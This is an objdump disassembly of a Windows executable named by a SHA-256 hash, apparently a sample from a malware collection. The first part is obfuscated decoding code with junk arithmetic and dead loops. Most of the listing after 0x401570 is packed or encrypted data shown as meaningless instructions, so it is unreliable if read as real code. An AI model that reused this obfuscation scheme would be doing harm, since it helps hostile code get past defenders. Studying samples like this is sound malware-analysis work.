
354527925137d0ce5e4b800b201a68f8e05847041317ed058683016695ef6764.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	push   ebx
  40100d:	movzx  ecx,WORD PTR ds:0x426e89
  401014:	or     DWORD PTR ds:0x426eb9,ecx
  40101a:	push   esi
  40101b:	add    ecx,0x2a4c
  401021:	push   edi
  401022:	mov    esi,0x75108b3
  401027:	xor    eax,esi
  401029:	mov    edi,0x3272fa
  40102e:	add    eax,edi
  401030:	mov    DWORD PTR [ebp-0x40],eax
  401033:	xor    eax,ecx
  401035:	mov    eax,ds:0x426149
  40103a:	mov    eax,DWORD PTR [eax]
  40103c:	sbb    ecx,0x1729
  401042:	mov    DWORD PTR [ebp-0x3c],eax
  401045:	and    DWORD PTR ds:0x426ec5,0x0
  40104f:	mov    ecx,DWORD PTR ds:0x426ec5
  401055:	inc    ecx
  401056:	mov    DWORD PTR ds:0x426ec5,ecx
  40105c:	cmp    DWORD PTR ds:0x426ec5,0x24
  401063:	jbe    0x401081
  401069:	jmp    0x401074
  40106e:	call   DWORD PTR ds:0x42fa00
  401074:	cmp    DWORD PTR ds:0x426ec5,0x1d
  40107b:	jb     0x40104f
  401081:	mov    eax,ds:0x426359
  401086:	dec    ecx
  401087:	mov    eax,DWORD PTR [eax]
  401089:	dec    ecx
  40108a:	mov    DWORD PTR [ebp-0x1c],eax
  40108d:	mov    DWORD PTR [ebp-0x34],0xf89c87b5
  401094:	sub    DWORD PTR ds:0x426f05,0x3e68
  40109e:	mov    eax,DWORD PTR [ebp-0x34]
  4010a1:	xor    eax,esi
  4010a3:	add    eax,edi
  4010a5:	mov    DWORD PTR [ebp-0x40],eax
  4010a8:	movzx  ecx,WORD PTR ds:0x426f19
  4010af:	sbb    DWORD PTR ds:0x426f05,ecx
  4010b5:	mov    eax,ds:0x4262c9
  4010ba:	mov    DWORD PTR [ebp-0x40],eax
  4010bd:	or     DWORD PTR ds:0x426ee1,0xb11
  4010c7:	mov    eax,DWORD PTR [ebp-0x3c]
  4010ca:	adc    DWORD PTR ds:0x426f05,0x426f01
  4010d4:	mov    DWORD PTR [ebp-0x14],eax
  4010d7:	sub    DWORD PTR ds:0x426ebd,ecx
  4010dd:	mov    eax,DWORD PTR [ebp-0x14]
  4010e0:	push   0x4
  4010e2:	adc    ecx,0x19c9
  4010e8:	pop    ecx
  4010e9:	or     DWORD PTR ds:0x426e85,0x426ee5
  4010f3:	sub    ecx,eax
  4010f5:	add    ecx,DWORD PTR [ebp-0x1c]
  4010f8:	sbb    eax,DWORD PTR ds:0x426f01
  4010fe:	mov    DWORD PTR [ebp-0x2c],0xf89c85f5
  401105:	mov    DWORD PTR [ebp-0x18],ecx
  401108:	mov    eax,ds:0x426e99
  40110d:	or     DWORD PTR ds:0x426f05,eax
  401113:	mov    DWORD PTR [ebp-0xa0],0xf89c85b9
  40111d:	and    DWORD PTR ds:0x426e81,0x0
  401127:	xor    eax,eax
  401129:	xor    eax,DWORD PTR ds:0x426e81
  40112f:	inc    eax
  401130:	mov    ds:0x426e81,eax
  401135:	cmp    DWORD PTR ds:0x426e81,0x25
  40113c:	jg     0x40117d
  401142:	jmp    0x401170
  401147:	push   DWORD PTR [ebp-0x28]
  40114a:	push   0x1250
  40114f:	push   DWORD PTR [ebp-0x14]
  401152:	push   DWORD PTR [ebp-0x10]
  401155:	push   DWORD PTR [ebp-0x14]
  401158:	push   0x2a2f
  40115d:	push   0x822a
  401162:	push   DWORD PTR [ebp-0x18]
  401165:	push   0x79ea
  40116a:	call   DWORD PTR ds:0x42fa04
  401170:	cmp    DWORD PTR ds:0x426e81,0x1e
  401177:	jb     0x401127
  40117d:	mov    eax,DWORD PTR [ebp-0x14]
  401180:	adc    DWORD PTR ds:0x426ee5,0x426ecd
  40118a:	mov    DWORD PTR [ebp-0x9c],eax
  401190:	mov    eax,ds:0x426ec5
  401195:	add    DWORD PTR ds:0x426ebd,eax
  40119b:	mov    eax,DWORD PTR [ebp-0x18]
  40119e:	mov    DWORD PTR [ebp-0x98],eax
  4011a4:	mov    eax,DWORD PTR [ebp-0x2c]
  4011a7:	inc    DWORD PTR ds:0x426edd
  4011ad:	xor    eax,esi
  4011af:	sbb    DWORD PTR ds:0x426eed,0x426e95
  4011b9:	add    eax,edi
  4011bb:	mov    DWORD PTR [ebp-0x94],eax
  4011c1:	lea    eax,[ebp-0x48]
  4011c4:	mov    DWORD PTR [ebp-0x90],eax
  4011ca:	sub    DWORD PTR ds:0x426f15,ecx
  4011d0:	mov    eax,DWORD PTR [ebp-0xa0]
  4011d6:	xor    eax,esi
  4011d8:	and    DWORD PTR ds:0x426ef1,0x42a0
  4011e2:	add    eax,edi
  4011e4:	mov    DWORD PTR [ebp-0xa0],eax
  4011ea:	sub    DWORD PTR ds:0x426f11,0x426e99
  4011f4:	lea    eax,[ebp-0xa0]
  4011fa:	mov    DWORD PTR ds:0x426f11,0x134d
  401204:	push   eax
  401205:	and    eax,0x6f55
  40120a:	mov    eax,DWORD PTR [ebp+0xc]
  40120d:	adc    DWORD PTR ds:0x426e91,0x426f11
  401217:	xor    eax,esi
  401219:	add    eax,edi
  40121b:	mov    DWORD PTR ds:0x426e81,0x195a
  401225:	push   eax
  401226:	mov    eax,ds:0x426f1d
  40122b:	xor    eax,DWORD PTR ds:0x426f0d
  401231:	mov    ds:0x426f1d,eax
  401236:	mov    eax,ds:0x4262e9
  40123b:	adc    DWORD PTR ds:0x426ee5,0x426ec5
  401245:	push   0x42623f
  40124a:	add    DWORD PTR ds:0x426ed1,0x1712
  401254:	push   DWORD PTR [eax]
  401256:	adc    DWORD PTR ds:0x426e91,0x17d3
  401260:	call   0x408594
  401265:	mov    DWORD PTR ds:0x426ee1,0x12
  40126f:	cmp    DWORD PTR ds:0x426ee1,0x0
  401276:	je     0x4012bc
  40127c:	cmp    DWORD PTR ds:0x426ee1,0x4
  401283:	ja     0x4012bc
  401289:	jmp    0x401294
  40128e:	call   DWORD PTR ds:0x42fa08
  401294:	cmp    DWORD PTR ds:0x426ee1,0x5
  40129b:	jne    0x4012ac
  4012a1:	mov    eax,ds:0x426ee1
  4012a6:	dec    eax
  4012a7:	mov    ds:0x426ee1,eax
  4012ac:	mov    eax,ds:0x426ee1
  4012b1:	dec    eax
  4012b2:	mov    ds:0x426ee1,eax
  4012b7:	jmp    0x40126f
  4012bc:	mov    ebx,DWORD PTR [ebp-0x14]
  4012bf:	dec    eax
  4012c0:	mov    eax,DWORD PTR [ebp-0x18]
  4012c3:	sub    edx,0x53c
  4012c9:	mov    DWORD PTR [ebp-0x58],eax
  4012cc:	and    DWORD PTR ds:0x426f2d,0x0
  4012d6:	mov    eax,ds:0x426f2d
  4012db:	inc    eax
  4012dc:	mov    ds:0x426f2d,eax
  4012e1:	cmp    DWORD PTR ds:0x426f2d,0x1f
  4012e8:	ja     0x401309
  4012ee:	jmp    0x4012fc
  4012f3:	push   DWORD PTR [ebp-0x18]
  4012f6:	call   DWORD PTR ds:0x42fa0c
  4012fc:	cmp    DWORD PTR ds:0x426f2d,0x15
  401303:	jb     0x4012d6
  401309:	mov    DWORD PTR [ebp-0x34],0xf89c8522
  401310:	xor    DWORD PTR ds:0x426ec1,ecx
  401316:	mov    eax,0xf89c85bb
  40131b:	inc    edx
  40131c:	mov    DWORD PTR [ebp-0x1c],eax
  40131f:	lea    ecx,[eax-0x6]
  401322:	sub    DWORD PTR ds:0x426e89,edx
  401328:	mov    DWORD PTR [ebp-0x28],ecx
  40132b:	mov    DWORD PTR ds:0x426f2d,0x18
  401335:	cmp    DWORD PTR ds:0x426f2d,0x0
  40133c:	je     0x401386
  401342:	cmp    DWORD PTR ds:0x426f2d,0xb
  401349:	jbe    0x401386
  40134f:	jmp    0x40135a
  401354:	call   DWORD PTR ds:0x42fa38
  40135a:	cmp    DWORD PTR ds:0x426f2d,0xc
  401361:	jne    0x401374
  401367:	mov    edx,DWORD PTR ds:0x426f2d
  40136d:	dec    edx
  40136e:	mov    DWORD PTR ds:0x426f2d,edx
  401374:	mov    edx,DWORD PTR ds:0x426f2d
  40137a:	dec    edx
  40137b:	mov    DWORD PTR ds:0x426f2d,edx
  401381:	jmp    0x401335
  401386:	mov    DWORD PTR [ebp-0x10],0xf89c85b4
  40138d:	mov    DWORD PTR [ebp-0x8],eax
  401390:	mov    eax,DWORD PTR [ebp-0x10]
  401393:	and    DWORD PTR ds:0x426f01,0x0
  40139d:	mov    edx,DWORD PTR ds:0x426f01
  4013a3:	inc    edx
  4013a4:	mov    DWORD PTR ds:0x426f01,edx
  4013aa:	cmp    DWORD PTR ds:0x426f01,0x21
  4013b1:	jle    0x4013d4
  4013b7:	jmp    0x4013c7
  4013bc:	push   0x575d
  4013c1:	call   DWORD PTR ds:0x42fa3c
  4013c7:	cmp    DWORD PTR ds:0x426f01,0x11
  4013ce:	jb     0x40139d
  4013d4:	xor    eax,esi
  4013d6:	inc    edx
  4013d7:	mov    edx,0xffcd8d87
  4013dc:	adc    DWORD PTR ds:0x426ea1,0x426ef5
  4013e6:	sub    edx,eax
  4013e8:	mov    DWORD PTR [ebp-0xc],edx
  4013eb:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  4013f2:	mov    eax,DWORD PTR [ebp-0x8]
  4013f5:	mov    DWORD PTR [ebp-0x3c],ebx
  4013f8:	cmp    eax,ecx
  4013fa:	mov    DWORD PTR ds:0x426e9d,0x528e
  401404:	je     0x403b99
  40140a:	mov    DWORD PTR ds:0x426e95,0x15
  401414:	cmp    DWORD PTR ds:0x426e95,0x0
  40141b:	je     0x401463
  401421:	cmp    DWORD PTR ds:0x426e95,0x19
  401428:	jge    0x401463
  40142e:	jmp    0x401451
  401433:	push   0x426ef9
  401438:	push   0x4b8b
  40143d:	push   DWORD PTR [ebp-0x24]
  401440:	push   0x61ed
  401445:	push   DWORD PTR [ebp-0xc]
  401448:	push   DWORD PTR [ebp-0x1c]
  40144b:	call   DWORD PTR ds:0x42fa40
  401451:	mov    ecx,DWORD PTR ds:0x426e95
  401457:	dec    ecx
  401458:	mov    DWORD PTR ds:0x426e95,ecx
  40145e:	jmp    0x401414
  401463:	mov    eax,DWORD PTR [ebp-0x10]
  401466:	and    DWORD PTR ds:0x426e91,0x0
  401470:	jmp    0x401482
  401475:	mov    ecx,DWORD PTR ds:0x426e91
  40147b:	inc    ecx
  40147c:	mov    DWORD PTR ds:0x426e91,ecx
  401482:	cmp    DWORD PTR ds:0x426e91,0x1c
  401489:	jae    0x4014e4
  40148f:	cmp    DWORD PTR ds:0x426e91,0xe
  401496:	jle    0x4014e4
  40149c:	jmp    0x4014c3
  4014a1:	push   0x419a
  4014a6:	push   0x5df1
  4014ab:	push   DWORD PTR [ebp-0x1c]
  4014ae:	push   DWORD PTR [ebp-0xc]
  4014b1:	push   DWORD PTR [ebp-0x18]
  4014b4:	push   DWORD PTR [ebp-0x10]
  4014b7:	push   DWORD PTR [ebp-0x20]
  4014ba:	push   DWORD PTR [ebp-0x28]
  4014bd:	call   DWORD PTR ds:0x42fa10
  4014c3:	cmp    DWORD PTR ds:0x426e91,0xd
  4014ca:	jne    0x4014df
  4014d0:	xor    ecx,ecx
  4014d2:	or     ecx,DWORD PTR ds:0x426e91
  4014d8:	inc    ecx
  4014d9:	mov    DWORD PTR ds:0x426e91,ecx
  4014df:	jmp    0x401475
  4014e4:	mov    ecx,DWORD PTR [ebp-0x10]
  4014e7:	xor    eax,esi
  4014e9:	xor    ecx,esi
  4014eb:	xor    DWORD PTR ds:0x426ef1,0x66eb
  4014f5:	lea    ecx,[eax+ecx*1+0x64e5f4]
  4014fc:	or     eax,0x4514
  401501:	mov    eax,DWORD PTR [ebp-0xc]
  401504:	xor    edx,edx
  401506:	sbb    DWORD PTR ds:0x426f0d,0x523c
  401510:	div    ecx
  401512:	mov    eax,DWORD PTR [ebp-0x8]
  401515:	and    DWORD PTR ds:0x426ea9,0x0
  40151f:	mov    ecx,DWORD PTR ds:0x426ea9
  401525:	inc    ecx
  401526:	mov    DWORD PTR ds:0x426ea9,ecx
  40152c:	cmp    DWORD PTR ds:0x426ea9,0xa
  401533:	jg     0x403903
  401539:	jmp    0x401544
  40153e:	call   DWORD PTR ds:0x42fa14
  401544:	cmp    DWORD PTR ds:0x426ea9,0x9
  40154b:	jne    0x40155e
  401551:	mov    ecx,DWORD PTR ds:0x426ea9
  401557:	inc    ecx
  401558:	mov    DWORD PTR ds:0x426ea9,ecx
  40155e:	cmp    DWORD PTR ds:0x426ea9,0x10
  401565:	jb     0x40151f
  40156b:	jmp    0x403903
  401570:	sub    BYTE PTR [esi+0x1],ah
  401573:	mov    eax,ds:0x6628e841
  401578:	pop    es
  401579:	and    eax,0xb490c454
  40157e:	fdiv   DWORD PTR [edx]
  401580:	jnp    0x4015fd
  401582:	jnp    0x4015ff
  401584:	hlt    
  401585:	pushf  
  401586:	jnp    0x401603
  401588:	ror    ch,cl
  40158a:	aam    0xbe
  40158c:	(bad)  
  40158d:	ret    0xccd8
  401590:	add    cl,0x86
  401593:	xchg   DWORD PTR ds:0x8a8b8a8b,ebp
  401599:	mov    bl,0x22
  40159b:	sbb    eax,0x88a991fe
  4015a0:	jle    0x40153a
  4015a2:	push   ecx
  4015a3:	or     DWORD PTR [edx-0x5465d36a],0x64fb6dc1
  4015ad:	ja     0x401543
  4015af:	stos   BYTE PTR es:[edi],al
  4015b0:	jl     0x401566
  4015b2:	jno    0x4015fb
  4015b4:	jl     0x4015f7
  4015b6:	inc    ebx
  4015b7:	mov    eax,0x1d87fccd
  4015bc:	sti    
  4015bd:	nop
  4015be:	jl     0x40159f
  4015c0:	or     dh,BYTE PTR [esi+0x640a3b2a]
  4015c6:	rcr    BYTE PTR [edi],1
  4015c8:	push   0x4896ecc6
  4015cd:	imul   esp,DWORD PTR ds:0xe51a8af4,0x15
  4015d4:	out    dx,eax
  4015d5:	sti    
  4015d6:	(bad)  
  4015d7:	fldcw  WORD PTR [ecx-0x76773813]
  4015dd:	ss dec esp
  4015df:	rcr    BYTE PTR [esi+0x6fc47e2],1
  4015e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015e6:	enter  0xb375,0x29
  4015ea:	cwde   
  4015eb:	neg    bl
  4015ed:	sti    
  4015ee:	jns    0x40162e
  4015f0:	sbb    BYTE PTR [edx],0x59
  4015f3:	pushf  
  4015f4:	push   0x63d5e43e
  4015f9:	scas   al,BYTE PTR es:[edi]
  4015fa:	lock pop edi
  4015fc:	mov    ebp,0x1be87073
  401601:	retf   0x6a93
  401604:	mov    ch,0xb0
  401606:	xchg   ebp,eax
  401607:	add    BYTE PTR [ebx+ebp*2],ch
  40160a:	(bad)  
  40160b:	xor    WORD PTR [ebp*1-0x5dfa7197],si
  401613:	xchg   ebx,eax
  401614:	lods   eax,DWORD PTR ds:[esi]
  401615:	in     eax,dx
  401616:	mov    edi,0x4ae0b7f0
  40161b:	test   al,0x2b
  40161d:	inc    esp
  40161e:	mov    cl,0x21
  401620:	in     eax,0x97
  401622:	cli    
  401623:	xchg   ebx,eax
  401624:	xchg   edi,eax
  401625:	inc    edx
  401626:	test   BYTE PTR [ecx-0x235c06c4],0x3b
  40162d:	cld    
  40162e:	dec    ebp
  40162f:	or     al,0xef
  401631:	mov    eax,ds:0x4f84efe5
  401636:	mov    dh,0x9d
  401638:	stos   DWORD PTR es:[edi],eax
  401639:	sub    bl,BYTE PTR [ebx]
  40163b:	mov    bl,0xd4
  40163d:	jne    0x4015d7
  40163f:	rol    DWORD PTR [ebx],1
  401641:	mov    dh,0x24
  401643:	push   ecx
  401644:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401645:	xchg   esi,eax
  401646:	or     BYTE PTR [ecx],0x8f
  401649:	push   ebx
  40164a:	sar    BYTE PTR [edx-0x405cc18e],0x30
  401651:	lods   al,BYTE PTR ds:[esi]
  401652:	test   bl,ch
  401654:	add    al,0xc3
  401656:	mov    esp,0x58c0038f
  40165b:	out    dx,al
  40165c:	xor    ah,dh
  40165e:	retf   0x1818
  401661:	mov    dh,0x2e
  401663:	push   0x3f
  401665:	xchg   ecx,eax
  401666:	pop    eax
  401667:	icebp  
  401668:	pop    ebx
  401669:	call   0x4964:0x167f6963
  401670:	fwait
  401671:	stos   BYTE PTR es:[edi],al
  401672:	imul   ecx,DWORD PTR [eax-0x16b77c81],0x6f1e43e8
  40167c:	lock fisttp DWORD PTR [esi]
  40167f:	xchg   ebx,eax
  401680:	sub    bh,BYTE PTR [eax+0xa]
  401683:	fisub  WORD PTR [esp+eax*8]
  401686:	mov    edx,0xd9d21449
  40168b:	push   es
  40168c:	daa    
  40168d:	xchg   DWORD PTR [ebx-0x1dc517f6],esi
  401693:	jmp    0xa3f2:0x592865f
  40169a:	loopne 0x40167d
  40169c:	loopne 0x401708
  40169e:	fldenv [ebp+0x40]
  4016a1:	enter  0x734a,0x6d
  4016a5:	ss scas eax,DWORD PTR es:[edi]
  4016a7:	js     0x40169b
  4016a9:	cmp    DWORD PTR [eax-0x230afea2],edi
  4016af:	das    
  4016b0:	jnp    0x4016ba
  4016b2:	inc    esi
  4016b3:	mov    dh,0xd
  4016b5:	pop    ds
  4016b6:	mov    al,ds:0x4d9e9f53
  4016bb:	or     esi,0x96ab2a4a
  4016c1:	adc    ch,bl
  4016c3:	and    eax,0xbb0d90ea
  4016c8:	outs   dx,DWORD PTR ds:[esi]
  4016c9:	pop    eax
  4016ca:	jno    0x4016e3
  4016cc:	add    eax,0x9283493d
  4016d1:	lods   eax,DWORD PTR ds:[esi]
  4016d2:	popa   
  4016d3:	mov    esp,0x1bf5017
  4016d8:	rcl    ah,1
  4016da:	push   ebp
  4016db:	add    al,0x12
  4016dd:	ins    DWORD PTR es:[edi],dx
  4016de:	add    eax,DWORD PTR [ebx+0xb202412]
  4016e4:	outs   dx,BYTE PTR ds:[esi]
  4016e5:	cwde   
  4016e6:	and    al,BYTE PTR [eax+0x19]
  4016e9:	jp     0x4016ba
  4016eb:	fsubr  DWORD PTR [edi+0x16]
  4016ee:	mov    esi,0x7cfd7d05
  4016f3:	aam    0xde
  4016f5:	daa    
  4016f6:	scas   eax,DWORD PTR es:[edi]
  4016f7:	push   eax
  4016f8:	sti    
  4016f9:	jle    0x401703
  4016fb:	cmp    eax,0x5d63a8a8
  401700:	sahf   
  401701:	xor    BYTE PTR [eax-0x28],bh
  401704:	cld    
  401705:	xor    DWORD PTR [ebx+0x3bbdd2e3],edx
  40170b:	repz and DWORD PTR [ecx],edx
  40170e:	add    edi,DWORD PTR [ebx-0x17]
  401711:	adc    al,0x85
  401713:	add    esp,DWORD PTR [edi+0x47]
  401716:	cdq    
  401717:	and    ebx,eax
  401719:	lods   eax,DWORD PTR ds:[esi]
  40171a:	sahf   
  40171b:	sbb    al,0xfa
  40171d:	data16 mov cl,0x82
  401720:	mov    edi,DWORD PTR [esi+ebx*4+0x77c5ab98]
  401727:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401728:	aaa    
  401729:	stos   BYTE PTR es:[edi],al
  40172a:	xor    DWORD PTR [edx+eax*1-0x76f057b6],ebx
  401731:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401732:	mov    ecx,0x3010b418
  401737:	add    eax,ebp
  401739:	jo     0x4017b0
  40173b:	xor    BYTE PTR [ecx-0x74],cl
  40173e:	push   ecx
  40173f:	retf   
  401740:	sub    al,0x22
  401742:	fs dec ecx
  401744:	mov    al,0xbb
  401746:	dec    edi
  401747:	scas   al,BYTE PTR es:[edi]
  401748:	push   0x83d90c25
  40174d:	xchg   DWORD PTR [ecx-0x1fe1e4ee],eax
  401753:	xor    al,0xf
  401756:	sbb    eax,0x5888555a
  40175b:	stos   BYTE PTR es:[edi],al
  40175c:	cmp    bl,BYTE PTR [ebx]
  40175e:	pop    ds
  40175f:	mov    esp,0x314db06c
  401764:	rcl    DWORD PTR [ebx],cl
  401766:	cmp    ch,ah
  401768:	sub    BYTE PTR ds:0xdcc21d70,ch
  40176e:	das    
  40176f:	add    BYTE PTR [edi-0xe],cl
  401772:	xchg   ebp,eax
  401773:	push   0x59
  401775:	inc    edi
  401776:	push   es
  401777:	jmp    0x4017cb
  401779:	xchg   esi,eax
  40177a:	pop    edx
  40177b:	stos   DWORD PTR es:[edi],eax
  40177c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40177d:	xor    eax,DWORD PTR [edi]
  40177f:	cwde   
  401780:	lock stc 
  401782:	(bad)  
  401783:	popa   
  401784:	push   ecx
  401785:	xor    DWORD PTR [ecx-0x2c],ebx
  401788:	es pop ds
  40178a:	mov    dl,0xfc
  40178c:	shr    BYTE PTR [ebx-0x16c745f6],1
  401792:	mov    al,0x84
  401794:	lahf   
  401795:	data16 ja 0x401792
  401798:	lods   al,BYTE PTR ds:[esi]
  401799:	mov    ah,0x95
  40179b:	push   eax
  40179c:	mov    ah,0xd4
  40179e:	mov    al,ds:0x43a9c762
  4017a3:	test   BYTE PTR [edx],0x6c
  4017a6:	push   0x12
  4017a8:	inc    esp
  4017aa:	ret    
  4017ab:	retf   0xf928
  4017ae:	hlt    
  4017af:	in     eax,dx
  4017b0:	js     0x401815
  4017b2:	enter  0x5df4,0xa9
  4017b6:	ins    BYTE PTR es:[edi],dx
  4017b7:	or     eax,DWORD PTR [ebx]
  4017b9:	pop    esi
  4017ba:	xlat   BYTE PTR ds:[ebx]
  4017bb:	cmp    al,0xc6
  4017bd:	lods   al,BYTE PTR ds:[esi]
  4017be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017bf:	or     eax,0xecf6d4b5
  4017c4:	not    DWORD PTR [edx]
  4017c6:	sbb    ah,al
  4017c8:	sbb    al,0x89
  4017ca:	xchg   ecx,eax
  4017cb:	xor    eax,0xd264179
  4017d0:	ret    0x4f5b
  4017d3:	jle    0x40183d
  4017d5:	lods   al,BYTE PTR ds:[esi]
  4017d6:	push   ss
  4017d7:	or     esi,DWORD PTR [eax+edi*4-0x29]
  4017db:	mov    eax,0x2eeceedd
  4017e0:	xor    DWORD PTR [ecx+0x70cf0a6a],0x60beeaf8
  4017ea:	mov    fs,WORD PTR [ebx]
  4017ec:	or     BYTE PTR [ecx],dl
  4017ee:	inc    ebx
  4017ef:	jecxz  0x40184e
  4017f1:	sbb    BYTE PTR [ecx-0x52f01123],ch
  4017f7:	pop    ecx
  4017f8:	and    DWORD PTR [ecx-0x22],edx
  4017fb:	and    eax,0x97756a4d
  401800:	ja     0x40183b
  401802:	in     al,dx
  401803:	pop    eax
  401804:	ss leave 
  401806:	std    
  401807:	pop    eax
  401808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401809:	pop    ebp
  40180a:	leave  
  40180b:	and    cl,BYTE PTR [ebp+0x5a5cb853]
  401811:	outs   dx,DWORD PTR ds:[esi]
  401812:	fwait
  401813:	sahf   
  401814:	adc    DWORD PTR [ecx],ebp
  401816:	test   al,0x63
  401818:	xor    ecx,ecx
  40181a:	pop    esi
  40181b:	jge    0x4017b1
  40181d:	jnp    0x401883
  40181f:	jle    0x4017a2
  401821:	cli    
  401822:	hlt    
  401823:	(bad)  
  401824:	adc    BYTE PTR [edx-0x54e905f4],0x4c
  40182b:	outs   dx,BYTE PTR ds:[esi]
  40182c:	pop    ebx
  40182d:	mov    al,ds:0x53e06c1e
  401832:	lds    ebx,FWORD PTR [edi+ebx*1-0x347e03a8]
  401839:	jmp    0x1df3:0xe384df42
  401840:	pop    ds
  401841:	outs   dx,DWORD PTR ds:[esi]
  401842:	invd   
  401844:	and    BYTE PTR [edi+0x7b],bl
  401847:	xchg   ebx,eax
  401848:	mov    bl,0xcd
  40184a:	sub    al,0xf8
  40184c:	or     al,0xf
  40184e:	(bad)  
  40184f:	push   0xffffffc7
  401851:	mov    eax,0x660ad0c8
  401856:	stos   DWORD PTR es:[edi],eax
  401857:	scas   eax,DWORD PTR es:[edi]
  401858:	pusha  
  401859:	je     0x401810
  40185b:	push   edi
  40185c:	js     0x401805
  40185e:	aas    
  40185f:	cli    
  401860:	mov    dl,0xe3
  401862:	stos   DWORD PTR es:[edi],eax
  401863:	ret    
  401864:	add    cl,bl
  401866:	rcr    BYTE PTR [eax],0xeb
  401869:	sub    esi,DWORD PTR [ebx+0x18f6176]
  40186f:	push   ss
  401870:	jle    0x40182e
  401872:	xchg   esi,eax
  401873:	pop    esp
  401874:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401875:	pop    edi
  401876:	mov    ds:0xb8f400d8,al
  40187b:	stc    
  40187c:	mov    al,ds:0x1984b249
  401881:	push   0xcaf3bfed
  401886:	test   BYTE PTR [edi-0x54],bl
  401889:	ror    DWORD PTR [edi],cl
  40188b:	lahf   
  40188c:	(bad)  
  40188d:	out    0x39,eax
  40188f:	rcl    DWORD PTR [eax-0x10],cl
  401892:	push   edx
  401893:	dec    edx
  401894:	jb     0x40189b
  401896:	jmp    0x4dd8b15a
  40189b:	xor    cl,cl
  40189d:	cli    
  40189e:	jp     0x401883
  4018a0:	fdivr  st,st(0)
  4018a2:	mov    eax,ds:0x6c8ed9e5
  4018a7:	jb     0x401879
  4018a9:	not    BYTE PTR [esi]
  4018ab:	inc    ebx
  4018ac:	fnstcw WORD PTR [edi]
  4018ae:	das    
  4018af:	mov    eax,ds:0x261458c6
  4018b4:	dec    ebx
  4018b5:	cmp    DWORD PTR [ebp+0x1d7c18a0],ebx
  4018bb:	cwde   
  4018bc:	(bad)  
  4018bd:	int3   
  4018be:	dec    ebx
  4018bf:	mov    ebx,0x8c7254c4
  4018c4:	outs   dx,BYTE PTR ds:[esi]
  4018c5:	pop    esi
  4018c6:	add    DWORD PTR [eax],ecx
  4018c8:	popf   
  4018c9:	xchg   ecx,eax
  4018ca:	mov    eax,0xcafd4882
  4018cf:	mov    esp,es
  4018d1:	xchg   ecx,eax
  4018d2:	jg     0x4018ce
  4018d4:	pop    esp
  4018d5:	pop    ebp
  4018d6:	push   ebp
  4018d7:	xor    eax,0xe2556f1a
  4018dc:	xchg   bh,ah
  4018de:	xchg   ebp,eax
  4018df:	jbe    0x4018d4
  4018e1:	js     0x4018ba
  4018e3:	jmp    0x9bfe:0x13925418
  4018ea:	fild   QWORD PTR [edx+eiz*1+0x5e193cb5]
  4018f1:	js     0x401891
  4018f3:	cmc    
  4018f4:	push   ecx
  4018f5:	cwde   
  4018f6:	repz mov ah,BYTE PTR [ebx]
  4018f9:	push   esp
  4018fa:	ror    BYTE PTR [eax],0xd8
  4018fd:	aam    0xd6
  4018ff:	xor    al,cl
  401901:	leave  
  401902:	push   ebp
  401903:	xor    eax,0x6e9f9feb
  401908:	jb     0x401960
  40190a:	or     BYTE PTR [eax+0x2d],cl
  40190d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40190e:	retf   
  40190f:	int    0xcc
  401911:	shl    DWORD PTR [eax+eax*2+0x63],0x72
  401916:	ss out 0xaa,al
  401919:	addr16 adc eax,0x279adabb
  40191f:	fidivr DWORD PTR [eax+0x78]
  401922:	mov    gs,edi
  401924:	cmp    eax,0x429222e4
  401929:	cmp    al,0xd1
  40192b:	icebp  
  40192c:	shl    BYTE PTR [eax-0x6b],1
  40192f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401930:	fwait
  401931:	mov    WORD PTR [ebp+0x1d],fs
  401934:	xor    bl,BYTE PTR [edi]
  401936:	push   ebp
  401937:	stc    
  401938:	idiv   DWORD PTR [edx*2-0x332c7aa8]
  40193f:	mov    edi,0xe61f18a6
  401944:	(bad)  
  401945:	scas   al,BYTE PTR es:[edi]
  401946:	lods   al,BYTE PTR ds:[esi]
  401947:	pop    ds
  401948:	push   edi
  401949:	test   BYTE PTR [esi-0x22],0x7
  40194d:	stc    
  40194e:	mov    edx,0xd57feb1b
  401953:	dec    esp
  401954:	mov    al,0xe6
  401956:	in     eax,0x6f
  401958:	cmp    BYTE PTR [edx-0x716ba8e],ch
  40195e:	inc    esi
  40195f:	js     0x4018eb
  401961:	popa   
  401962:	je     0x4019ae
  401964:	in     al,dx
  401965:	mov    ds:0xdc590ceb,al
  40196a:	push   0x2c
  40196c:	ror    DWORD PTR [esi],1
  40196e:	ins    BYTE PTR es:[edi],dx
  40196f:	push   ebp
  401970:	inc    ebx
  401971:	lock in al,0xa9
  401974:	jle    0x4019e0
  401976:	xchg   ecx,eax
  401977:	loopne 0x40194c
  401979:	and    edx,esi
  40197b:	aaa    
  40197c:	and    bl,bh
  40197e:	jge    0x401978
  401980:	shr    bh,1
  401982:	sub    eax,0x506c4a9f
  401987:	pop    ebx
  401988:	lahf   
  401989:	xor    BYTE PTR [eax-0x6e],0x61
  40198d:	out    dx,eax
  40198e:	adc    al,0x98
  401990:	pop    ebp
  401991:	xchg   ebp,eax
  401992:	mov    dh,0x41
  401994:	fwait
  401995:	test   BYTE PTR [edx+0x37],ah
  401998:	(bad)  
  401999:	pop    ecx
  40199a:	sub    al,0x8b
  40199c:	cmp    ecx,DWORD PTR [ebx+0x28ed4a52]
  4019a2:	push   edi
  4019a3:	mov    edi,DWORD PTR [edi+0x2d4b2f8e]
  4019a9:	mov    ds,edi
  4019ab:	pop    edx
  4019ac:	pop    ss
  4019ad:	pop    edx
  4019ae:	lea    edi,[eax+0x2c]
  4019b1:	mov    ebx,0xa3277e69
  4019b6:	(bad)  
  4019b7:	mov    ebp,DWORD PTR [eax-0x19]
  4019ba:	pop    esi
  4019bb:	cmp    ebx,ebp
  4019bd:	sbb    al,0x6f
  4019bf:	ds aam 0xd2
